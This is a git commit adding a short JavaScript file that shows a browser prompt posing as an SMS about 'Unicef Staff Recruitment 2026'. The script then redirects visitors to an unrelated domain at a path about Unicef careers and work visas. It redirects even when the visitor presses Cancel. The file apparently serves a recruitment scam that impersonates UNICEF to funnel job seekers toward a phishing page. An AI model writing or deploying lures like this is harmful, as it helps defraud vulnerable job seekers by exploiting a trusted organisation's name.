1ab68b18b6ee6498e08b81bcfbbffe0296918ccd
usorondo58 <upturns-chosen2o@icloud.com>
2026-04-01 11:49:35 +0100

    Create uniceff.js

---
+++ uniceff.js
@@ -0,0 +1,9 @@
+
+var password = 'APPLY'
+password = prompt(
+  'SMS: Welcome to Unicef Staff Recruitment 2026. Please click OK to Proceed.',
+  'APPLY'
+);
+if (password != 'APPLY') {
+  location.href = 'https://www.nsadditid.site/unicef-career-workvisa';
+}
